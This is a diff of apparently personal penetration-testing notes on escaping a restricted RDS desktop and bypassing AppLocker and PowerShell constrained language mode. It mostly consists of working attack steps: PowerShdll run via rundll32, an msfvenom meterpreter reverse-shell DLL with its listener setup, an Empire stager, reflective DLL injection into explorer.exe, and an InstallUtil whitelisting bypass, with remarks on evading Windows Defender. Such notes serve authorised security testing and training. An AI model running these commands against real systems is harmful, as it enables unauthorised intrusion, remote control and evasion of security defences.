@@ -6,6 +6,10 @@ Additionally this scenario has Applocker on the target box, Powershell is in Lan
 * The RDS server does not block port 80 outbound.
 * .Net v3.5 for dll mode in PowerShdll
 
+**Important notes**
+powershell.exe _is_ not Powershell. It just hosts the assembly that contains PowerShell and handles I/O. System.Management.Automation.dll
+Learn more from the links at the bottom of this article.
+
 #### Getting shell from RDS notepad
 https://blog.netspi.com/breaking-out-of-applications-deployed-via-terminal-services-citrix-and-kiosks/
 https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/
@@ -21,33 +25,39 @@ Download PowerShdll
 https://github.com/p3nt4/PowerShdll
 Now go to IE again, host powershdll.dll on Kali web server using `python -m SimpleHTTPServer 80`
 Navigate to the following URL in IE where http://10.7.253.10/PowerShdll.dll
-Save as -> PowerShdll.dll on the Desktop
+Save as -> PowerShdll.dll to whatever folder you like. `C:\Windows\Tasks` is generally nice to use when Applocker is installed because it is usually whitelisted. I'm not sure exactly how to check for DLL rules in an Applocked environment yet.
 Now navigate to the desktop in the other powershell prompt
 Use rundll32 to execute the dll
-rundll32 .\PowerShdll.dll,main -w
+`rundll32 .\PowerShdll.dll,main -w`
 A new interactive powershell prompt should pop up
 Verify that constrained language mode has been bypassed with
 $ExecutionContext.SessionState.LanguageMode
 It should say FullLanguage
 
 #### Getting meterpreter shell
-
+Generate a dll payload
 ```
 msfvenom windows/x64/meterpreter/reverse_tcp lhost=10.7.253.10 lport=8081 -f dll -o msf.dll
 ```
-
 Set up listener in msf with same payload, host and port.
-use
-Download the msf.dll using internet explorer save as trick from before
-Use rundll32 to execute the dll. We use this because rundll32 is a binary that will not be blocked by Applocker.
+
+```
+use multi/handler
+set host tun0
+set port 8081
+set payload windows/x64/meterpreter/reverse_tcp
+exploit
+```
+
+Download the msf.dll using the IE "save as" trick from before. For some reason I am not sure the dll payload is not taken by Windows Defender, not on disk and not when executed.
+Now, use rundll32 to execute the dll. We use this because rundll32 is a binary that will not be blocked by Applocker.
 
 `rundll32 .\PowerShdll.dll,Control_RunDLL`
 
-
-Shell should now spawn in msf
+Shell should now spawn in msf.
 
 #### Empire without powershell.exe
-This assumes you have a metasploit Session
+This assumes you have a metasploit Session established.
 In Empire, create an empire listener and stager. The important things is to set Base64 to false to prevent the stager from calling powershell.exe, which won't work here because of the constrained language mode.
 ```
 uselistener http
@@ -67,16 +77,6 @@ powershell_shell
 ```
 Copypaste the empire listener in the interactive shell, and an agent should spawn in Empire. Congratulations!
 
-
-### Other useful links
-
-
-https://bneg.io/2017/07/26/empire-without-powershell-exe/
-https://artofpwn.com/offensive-and-defensive-powershell-ii.html
-https://improsec.com/blog/babushka-dolls-or-how-to-bypass-application-whitelisting-and-constrained-powershell
-https://github.com/caseysmithrc/DeviceGuardBypasses
-https://github.com/Joshua1909/AllTheThings
-https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html
 
 
 
@@ -98,11 +98,9 @@ $Encoded | Out-File "C:\Windows\Tasks\dll.txt"
 ```
 
 
-
-4 Copypaste the content of dll.txt into a variable 
+4 Copypaste the content of dll.txt into a new variable in Invoke-ReflectivePEInjection.ps1
 ```
-$dllData in .\Invoke-ReflectivePEInjection.ps1 and add the following lines
-$dllData = "DLLBASE64"
+$dllData = "DLLBASE64_GOES_HERE"
 $ProcId = (Get-Process explorer).Id
 $Bytes = [System.Convert]::FromBase64String($dllData)
 Invoke-ReflectivePEInjection -PEBytes $Bytes -ProcId $ProcId
@@ -121,3 +119,16 @@ copy-item .\Bypass.exe c:\windows\tasks
 cd c:\windows\tasks
 C:\windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\Bypass.exe
 ```
+
+
+### Useful links
+
+https://www.youtube.com/watch?v=czJrXiLs0wM
+https://adsecurity.org/?p=2921
+https://bneg.io/2017/07/26/empire-without-powershell-exe/
+https://artofpwn.com/offensive-and-defensive-powershell-ii.html
+https://improsec.com/blog/babushka-dolls-or-how-to-bypass-application-whitelisting-and-constrained-powershell
+https://github.com/caseysmithrc/DeviceGuardBypasses
+https://github.com/Joshua1909/AllTheThings
+https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html
+
